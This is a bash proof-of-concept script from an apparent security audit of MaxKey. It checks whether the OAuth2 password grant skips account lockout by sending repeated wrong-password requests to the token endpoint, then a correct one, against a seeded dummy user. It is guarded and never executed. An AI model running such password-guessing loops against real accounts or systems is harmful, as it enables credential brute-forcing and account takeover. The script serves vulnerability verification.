#!/usr/bin/env bash
# =============================================================================
#  repro-oauth2-lockout.sh
#
#  ###########################################################################
#  #  NOT EXECUTED BY THE AUDIT.                                          #
#  #  This script was WRITTEN but NEVER RUN. The audit environment had no #
#  #  MaxKey instance, no network access and no database. Every           #
#  #  "EXPECTED IF VULNERABLE" / "EXPECTED IF FIXED" statement below is a #
#  #  PREDICTION derived from reading the source, NOT an observation.     #
#  ###########################################################################
#
#  FINDING
#    maxkey-20261002-oauth2-password-grant-no-lockout
#
#  SOURCE BASIS (verified by reading the repo at commit
#                 3e5662b1a91291c0d85de826544119c86e77d8e6)
#    1. The interactive login stack enforces the password policy, which is
#       where lockout lives:
#         maxkey-authentications/maxkey-authentication-provider/.../provider/impl/
#           NormalAuthenticationProvider.java:90
#           MfaAuthenticationProvider.java:91
#           AppAuthenticationProvider.java:87
#             authenticationRealm.getLoginService().passwordPolicyValid(userInfo);
#         maxkey-persistence/.../service/impl/LoginServiceImpl.java:139
#             public boolean passwordPolicyValid(UserInfo userInfo)
#       (TrustedAuthenticationProvider.java:64 has the call COMMENTED OUT.)
#    2. The OAuth2 password grant does NOT go through that stack. It uses a
#       separate provider built in Oauth20AutoConfiguration:
#         maxkey-protocols/maxkey-protocol-oauth-2.0/.../Oauth20AutoConfiguration.java:335-338
#           OAuth2UserDetailsService userDetailsService = new OAuth2UserDetailsService();
#           DaoAuthenticationProvider daoAuthenticationProvider =
#               new DaoAuthenticationProvider(userDetailsService);
#       fed by ResourceOwnerPasswordTokenGranter:
#         maxkey-protocols/.../provider/password/ResourceOwnerPasswordTokenGranter.java:62-75
#           Authentication userAuth = new UsernamePasswordAuthenticationToken(username, password);
#           userAuth = authenticationManager.authenticate(userAuth);
#           ...
#           throw new InvalidGrantException("Could not authenticate user: " + username);
#       No passwordPolicyValid call appears anywhere on this path.
#    3. The resulting principal hard-codes the lock flags to true, so a locked
#       account is not represented as locked on this path:
#         maxkey-authentications/maxkey-authentication-core/.../SignPrincipal.java:73-77
#           this.accountNonLocked  = true;
#           this.credentialsNonExpired = true;
#           this.enabled = true;
#
#  CONSEQUENCE BEING TESTED
#    An attacker can make unlimited password guesses against the OAuth2 token
#    endpoint without ever tripping the lockout counter that protects the
#    interactive login form.
#
#  WHAT THIS SCRIPT CANNOT PROVE
#    * It cannot prove the counter is not incremented in the DB. Check the
#      mxk_userinfo.BADPASSWORDCOUNT column before and after to see which it is.
#    * A deployment may have a WAF, gateway rate limit, or the OAuth2 password
#      grant disabled entirely. If the grant type is disabled you will get
#      "unsupported_grant_type", which is INCONCLUSIVE, not FIXED.
#    * This is a real credential-spraying test. Only ever point it at the
#      DUMMY user created by seed/two-tenant-seed.sql.
#
#  PREREQUISITES
#    * A DISPOSABLE MaxKey instance you own and are authorised to test.
#    * seed/two-tenant-seed.sql applied, giving the dummy user
#      'poc_tenant2_user' in tenant 'poc-inst-2'.
#    * An OAuth2 client with the password grant enabled, whose secret you set
#      yourself. Read it from mxk_apps_oauth_client_details on the instance.
#    * curl.
#
#  USAGE
#    POC_I_HAVE_AUTHORIZATION=1 \
#    POC_TARGET_HOST=http://127.0.0.1:8080 \
#    POC_OAUTH_CLIENT_ID=your-client-id POC_OAUTH_CLIENT_SECRET=your-client-secret \
#    ./repro-oauth2-lockout.sh
#
#  Environment:
#    POC_TARGET_HOST            (required) base URL of the disposable instance
#    POC_I_HAVE_AUTHORIZATION=1 (required) acknowledgement of authorisation
#    POC_OAUTH_CLIENT_ID        (required) OAuth2 client id
#    POC_OAUTH_CLIENT_SECRET    (required) OAuth2 client secret
#    POC_TARGET_USER            (optional, default: poc_tenant2_user)  DUMMY ONLY
#    POC_ATTEMPTS               (optional, default: 20) how many wrong guesses
#    POC_CORRECT_PASSWORD       (optional) if set, the final attempt uses the
#                               real password to show the account is still usable
# =============================================================================

set -uo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
. ./_lib.sh

SCRIPT_NAME="repro-oauth2-lockout.sh"
poc_guard "$SCRIPT_NAME"

HOST="${POC_TARGET_HOST%/}"
require POC_OAUTH_CLIENT_ID "Read it from mxk_apps_oauth_client_details on the instance."
require POC_OAUTH_CLIENT_SECRET "Read it from mxk_apps_oauth_client_details on the instance."

TARGET_USER="${POC_TARGET_USER:-poc_tenant2_user}"
ATTEMPTS="${POC_ATTEMPTS:-20}"
TOKEN_URL="$HOST/oauth2/token"

trap poc_cleanup EXIT

echo
echo "=============================================================================="
echo " Finding 4: OAuth2 password grant does not enforce account lockout"
echo "   target user : $TARGET_USER   (DUMMY user from seed/two-tenant-seed.sql)"
echo "   attempts    : $ATTEMPTS deliberately wrong passwords"
echo "   token URL   : $TOKEN_URL"
echo "=============================================================================="
echo
echo "  This SENDS REAL FAILED LOGIN ATTEMPTS against the dummy account."
echo "  It must never be pointed at a real user."
echo

REFUSED=0
ACCEPTED=0
GRANT_DISABLED=0
FIRST_BODY=""

echo "[PHASE 1] sending $ATTEMPTS wrong-password attempts to the token endpoint"
echo

i=1
while [ "$i" -le "$ATTEMPTS" ]; do
  CODE=$(poc_curl POST "$TOKEN_URL" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "grant_type=password" \
    --data-urlencode "username=$TARGET_USER" \
    --data-urlencode "password=WrongGuess_${i}_DefinitelyNotIt!" \
    --data-urlencode "client_id=$POC_OAUTH_CLIENT_ID" \
    --data-urlencode "client_secret=$POC_OAUTH_CLIENT_SECRET")
  BODY=$(poc_body)
  if [ "$i" = "1" ]; then
    poc_require_reachable "$TOKEN_URL" "$SCRIPT_NAME"
  fi

  if [ -z "$FIRST_BODY" ]; then
    FIRST_BODY="$BODY"
  fi

  if printf '%s' "$BODY" | grep -qi 'unsupported_grant_type'; then
    GRANT_DISABLED=$((GRANT_DISABLED + 1))
    if [ "$i" = "1" ]; then
      echo "  attempt $i: HTTP $CODE  unsupported_grant_type"
    fi
  elif printf '%s' "$BODY" | grep -qiE '"access_token"[[:space:]]*:'; then
    ACCEPTED=$((ACCEPTED + 1))
    poc_warn "attempt $i returned an ACCESS TOKEN with a wrong password. STOP."
    printf '%s\n' "$BODY" | head -c 300
    echo
  else
    REFUSED=$((REFUSED + 1))
    if [ "$i" = "1" ] || [ "$i" -eq "$ATTEMPTS" ]; then
      echo "  attempt $i: HTTP $CODE  refused ($(printf '%s' "$BODY" | head -c 90))"
    else
      printf '.'
    fi
  fi
  i=$((i + 1))
done

echo
echo
echo "[PHASE 1 RESULT] refused=$REFUSED  accepted=$ACCEPTED  grant_disabled=$GRANT_DISABLED"
echo "  first response body was:"
printf '%s\n' "$FIRST_BODY" | head -c 400
echo
echo

# -----------------------------------------------------------------------------
# Verdict on phase 1.
# -----------------------------------------------------------------------------
echo "[PHASE 2] verdict on brute-force resistance"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * All $ATTEMPTS attempts are refused individually, AND the account is"
echo "      still not locked afterwards — i.e. the endpoint will keep evaluating"
echo "      guesses indefinitely. Refusal of each guess is normal; the finding is"
echo "      that the ACCOUNT never locks."
echo
echo "  EXPECTED IF FIXED"
echo "    * After the configured bad-password threshold, responses change to an"
echo "      explicit locked/disabled error, and the correct password stops working."
echo

if [ "$GRANT_DISABLED" -eq "$ATTEMPTS" ]; then
  poc_inconclusive "the password grant is disabled on this instance (unsupported_grant_type)."
  poc_inconclusive "That is a configuration state, NOT evidence the finding is fixed."
elif [ "$ACCEPTED" -gt 0 ]; then
  poc_inconclusive "the token endpoint issued tokens for wrong passwords. This is a"
  poc_inconclusive "SEPARATE and more serious defect. Stop and report it as its own issue."
else
  poc_vulnerable "the token endpoint answered $REFUSED/$ATTEMPTS wrong-password attempts"
  poc_vulnerable "without ever signalling a lockout. No response indicated a locked account."
fi

# -----------------------------------------------------------------------------
# PHASE 3 — the decisive part: is the account still usable?
#   This is what separates 'passwords are checked' from 'the account is locked'.
# -----------------------------------------------------------------------------
echo
echo "[PHASE 3] is the account still usable after $ATTEMPTS failures?"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * The request with the CORRECT password still succeeds and returns an"
echo "      access token, proving no lockout was applied."
echo "  EXPECTED IF FIXED"
echo "    * The correct password is now refused with a locked/disabled error,"
echo "      even though it is correct."
echo
echo "  Set POC_CORRECT_PASSWORD to run this phase."
echo "  It defaults to the dummy password used by seed/two-tenant-seed.sql."
echo

CORRECT_PW="${POC_CORRECT_PASSWORD:-DummyPassw0rd!}"
C_CODE=$(poc_curl POST "$TOKEN_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "grant_type=password" \
  --data-urlencode "username=$TARGET_USER" \
  --data-urlencode "password=$CORRECT_PW" \
  --data-urlencode "client_id=$POC_OAUTH_CLIENT_ID" \
  --data-urlencode "client_secret=$POC_OAUTH_CLIENT_SECRET")
C_BODY=$(poc_body)
poc_info "correct-password request returned HTTP $C_CODE"

if printf '%s' "$C_BODY" | grep -qiE '"access_token"[[:space:]]*:'; then
  poc_vulnerable "the account STILL logs in after $ATTEMPTS consecutive failures."
  poc_vulnerable "A correct password returns an access token, so no lockout was enforced."
  echo "  (The token value is deliberately not printed. Revoke or ignore it.)"
elif printf '%s' "$C_BODY" | grep -qiE 'locked|disabled|account'; then
  poc_fixed "the account is locked: the correct password is now refused."
else
  poc_fixed "the correct password did NOT return a token (HTTP $C_CODE)."
  printf '%s\n' "$C_BODY" | head -c 300
  echo
fi

# -----------------------------------------------------------------------------
# PHASE 4 — cross-check the database counter. Optional but it is what
# distinguishes 'no counter increment' from 'counter incremented but not acted on'.
# -----------------------------------------------------------------------------
echo
echo "[PHASE 4] database cross-check (run by hand, this script has no DB access)"
echo
echo "    SELECT USERNAME, BADPASSWORDCOUNT, ISLOCKED FROM mxk_userinfo"
echo "     WHERE USERNAME = '$TARGET_USER';"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * BADPASSWORDCOUNT is still 0 or NULL, because nothing on the OAuth2"
echo "      path called passwordPolicyValid / badPasswordCount()."
echo "    * ISLOCKED is still 1 (unlocked)."
echo "  EXPECTED IF FIXED"
echo "    * BADPASSWORDCOUNT reflects the $ATTEMPTS failures, and ISLOCKED has"
echo "      flipped to 0 (locked) once the threshold was crossed."

poc_summary "$SCRIPT_NAME"
